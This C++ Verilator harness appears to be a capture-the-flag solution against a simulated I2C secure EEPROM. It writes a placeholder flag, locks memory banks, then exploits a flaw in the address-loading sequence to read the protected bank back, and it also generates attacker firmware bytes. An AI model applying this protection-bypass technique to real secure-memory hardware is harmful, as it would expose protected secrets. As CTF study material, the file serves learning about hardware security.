#include <stdlib.h>
#include "Vseeprom.h"
#include "Vseeprom__Syms.h"
#include "verilated.h"
#include <iostream>
#include <functional>
#include <fstream>

#include <cstring>

int SECURE_PREFIX = 0b01010000;
int EEPROM_PREFIX = 0b10100000;

char WRITE_DATA = 0xfb;
char WRITE_CLOCK = 0xfa;
char WRITE_STDOUT = 0xfd;
char MOV_TO_R4 = 0x7c;
char MOV_FROM_R4 = 0x8c;
char MOV_SFR_TO_R4 = 0xac;


bool I2C_START = true;
static bool WRITE_FIRMWARE = false;

const char* FLAG = "On the real server the flag is loaded here";

std::ofstream output("binary.raw", std::ios::binary);


char read_i2c_data(Vseeprom* emu) {
    if (WRITE_FIRMWARE) {
        output << MOV_SFR_TO_R4 << WRITE_DATA;
        output << MOV_FROM_R4 << WRITE_STDOUT;
    }
    return emu->o_i2c_sda;
}

void set_clk(Vseeprom* emu, int val) {
    emu->i_clk = val;
}

void set_i2c_clock(Vseeprom* emu, int val) {
    if (WRITE_FIRMWARE) {
        output << MOV_TO_R4 << (char)val;
        output << MOV_FROM_R4 << WRITE_CLOCK;
    }
    
    emu->i_i2c_scl = val;
}

void set_i2c_data(Vseeprom* emu, int val) {
    if (WRITE_FIRMWARE) {
        output << MOV_TO_R4 << (char)val;
        output << MOV_FROM_R4 << WRITE_DATA;
    }
    emu->i_i2c_sda = val;
}


template<typename T>
void tacted_execute(Vseeprom* emu, T functor) {
    set_clk(emu, 0);
    functor(emu);
    emu->eval();
    std::cout << "I2C State is : " << emu->seeprom__DOT__i2c_state << std::endl;
    set_clk(emu, 1);
    emu->eval();
}


void start_bus(Vseeprom* emu) {
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_data(emu, 1);
        }
    );

    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 1);
        }
    );

    
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_data(emu, 0);
        }
    );

    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 0);
        }
    );

    
    tacted_execute(emu, [](Vseeprom*){});
}

void stop_bus(Vseeprom* emu) {
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_data(emu, 0);
        }
    );

    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 1);
        }
    );
    
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_data(emu, 1);
        }
    );

    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 0);
        }
    );
    
    tacted_execute(emu, [](Vseeprom*){});
}

void load_bus(Vseeprom* new_protected_rom, int prefix, bool start=false){
    if (start) {
        start_bus(new_protected_rom);
    }

    for (int idx = 7; idx >= 0; idx--) {
        tacted_execute(new_protected_rom, [idx, prefix](Vseeprom* emu){
            set_i2c_data(emu, (prefix >> idx) % 2);
	});
	tacted_execute(new_protected_rom, [](Vseeprom* emu){
            set_i2c_clock(emu, 1);
        });
	tacted_execute(new_protected_rom, [](Vseeprom* emu){
            set_i2c_clock(emu, 0);
        });

    }
    tacted_execute(new_protected_rom, [](Vseeprom*){});
    
}

void cycle_through_bus(Vseeprom* new_protected_rom) {
    tacted_execute(new_protected_rom, [](Vseeprom* emu){
        set_i2c_clock(emu, 1);
    });
    tacted_execute(new_protected_rom, [](Vseeprom* emu){
        set_i2c_clock(emu, 0);
    });
}

void write_string(Vseeprom* emu, int addr, const char* data, unsigned int size) {
    // I2C_Control_Eeprom (now address is valid and we can read)
    load_bus(emu, EEPROM_PREFIX, I2C_START);
    cycle_through_bus(emu);
    // I2C_Load_Address
    load_bus(emu, addr);
    cycle_through_bus(emu);
    for (int idx = 0; idx < size; idx++) {
        std::cout << "Writing one byte(" << data[idx] << ")..." << std::endl;
        for (int jdx = 7; jdx >= 0; jdx--) {
	    tacted_execute(emu, [jdx, idx, data](Vseeprom* emu){
		set_i2c_data(emu, (data[idx] >> jdx) % 2);
	    });
	    tacted_execute(emu, [](Vseeprom* emu){
	        set_i2c_clock(emu, 1);
            });
	    tacted_execute(emu, [](Vseeprom* emu){
	        set_i2c_clock(emu, 0);
	    });

	}
        // ACK if continuing write else STOP after last byte
        if (idx == size - 1) {
            stop_bus(emu);
        } else {
	    cycle_through_bus(emu);
        }
    }
}

void read_string(Vseeprom* emu, int addr, char* output, unsigned int size) {
    // I2C_Control_Eeprom (to load address)
    load_bus(emu, EEPROM_PREFIX, I2C_START);
    cycle_through_bus(emu);
    // I2C_Load_Address
    load_bus(emu, addr);
    // I2C_Control_Eeprom (now address is valid and we can read)
    load_bus(emu, EEPROM_PREFIX + 1, I2C_START);
    // just read what the bus gives us
    cycle_through_bus(emu);
    for (int idx = 0; idx < size; idx++) {
        for (int jdx = 7; jdx >= 0 ; jdx--) {
            std::cout << "Bit read : " << read_i2c_data(emu) << std::endl;
            output[idx] |= read_i2c_data(emu) << jdx;
            cycle_through_bus(emu);
	}
        // ACK or smth similar
	cycle_through_bus(emu);
    }
}

void hacky_read(Vseeprom* emu, int required_address, int size=16) {
    // I2C_Control_Eeprom (to load address)
    load_bus(emu, EEPROM_PREFIX, I2C_START);
    cycle_through_bus(emu);
    // I2C_Load_Address
    int close_address = required_address >> 2;
    load_bus(emu, close_address);
    
    // I2C_Control_Eeprom (now address is valid and we can read)
    load_bus(emu, EEPROM_PREFIX, I2C_START);
    cycle_through_bus(emu);
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_data(emu, 0);
    });
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 1);
    });
    tacted_execute(emu, [](Vseeprom* emu){
        set_i2c_clock(emu, 0);
    });
    std::cout << "[+] Succesfully uploaded protected address as valid!" << std::endl;
    load_bus(emu, EEPROM_PREFIX + 1, I2C_START);
    cycle_through_bus(emu);

    char*  output = new char[size];
    memset(output, 0, size);

    for (int idx = 0; idx < size; idx++) {
        for (int jdx = 7; jdx >= 0; jdx--) {
            output[idx] |= read_i2c_data(emu) << jdx;
	    cycle_through_bus(emu);

	}
        // ACK or smth similar
	cycle_through_bus(emu);
    }
    std::cout << "[*] Somehow got string : '" << output << "'" << std::endl;
    for (int idx = 0; idx < strlen(FLAG); idx++) {
        if (FLAG[idx] != output[idx]) {
            std::cout << "Original byte was " << FLAG[idx] << " but here we have " << output[idx] << std::endl;
            std::cout << "Couldn't steal flag =(";
            exit(1);
        }
    }

    delete output;
    std::cout << "[+] Succesfully stolen flag, wow!" << std::endl;
}

void verify_flag(Vseeprom* emu) {
    char*  output = new char[strlen(FLAG)];
    memset(output, 0, strlen(FLAG));
    read_string(emu, 64, output, strlen(FLAG));
    std::cout << "[*] String : '" << output << "'" << std::endl;
    for (int idx = 0; idx < strlen(FLAG); idx++) {
        if (FLAG[idx] != output[idx]) {
            std::cout << "Original byte was " << FLAG[idx] << " but here we have " << output[idx] << std::endl;
            std::cout << "Couldn't read flag =(";
            exit(1);
        }
    }
    delete output;
    std::cout << "[+] Succesfully verified flag!" << std::endl;
}


void write_flag(Vseeprom* emu) {
    std::cout << "[*] Trying to write flag..." << std::endl;
    write_string(emu, 64, FLAG, strlen(FLAG));
    std::cout << "[+] Succesfully written flag!" << std::endl;
}

void secure_banks(Vseeprom* emu, int mask) {
    if (mask > 16) {
        std::cout << "[-]Only got 16 banks here, failure!" << std::endl;
        exit(1);
    }
    // I2C_Control_Secure
    load_bus(emu, SECURE_PREFIX + mask, I2C_START);
    cycle_through_bus(emu);
}
    

void try_hacks(Vseeprom* new_protected_rom) {
    // I2C_Control_Secure
    load_bus(new_protected_rom, SECURE_PREFIX, I2C_START);
    cycle_through_bus(new_protected_rom);
    // I2C_Control_Eeprom (to load address)
    load_bus(new_protected_rom, EEPROM_PREFIX, I2C_START);
    cycle_through_bus(new_protected_rom);
    // I2C_Load_Address
    load_bus(new_protected_rom, SECURE_PREFIX);
    // I2C_Control_Eeprom (now address is valid and we can read)
    load_bus(new_protected_rom, EEPROM_PREFIX + 1, I2C_START);
    // just read what the bus gives us
    for (int idx = 0; idx < 1 + 8 ; idx++) {
        cycle_through_bus(new_protected_rom);
        std::cout << "Bit read : " << new_protected_rom->o_i2c_sda << std::endl;
    }
    cycle_through_bus(new_protected_rom);
}
    



int main(int argc, char** argv) {
    Verilated::commandArgs(argc, argv);

    Vseeprom* new_protected_rom = new Vseeprom;
    while (!Verilated::gotFinish()) {
        //dunno, special case or smth
	set_clk(new_protected_rom, 1);
        new_protected_rom->eval();
        write_flag(new_protected_rom);
        verify_flag(new_protected_rom);
        secure_banks(new_protected_rom, 2);
        // here we are pretty much at the state where start of user code 
        // emulation is in original challenge
        WRITE_FIRMWARE = true;
	tacted_execute(new_protected_rom, [](Vseeprom* emu){
	    set_i2c_data(emu, 0);
        });
	tacted_execute(new_protected_rom, [](Vseeprom* emu){
	    set_i2c_clock(emu, 0);
        });

        hacky_read(new_protected_rom, 0x40, strlen(FLAG));
	// verify_flag(new_protected_rom);
        cycle_through_bus(new_protected_rom);
      	exit(EXIT_SUCCESS);

    } exit(EXIT_SUCCESS);

}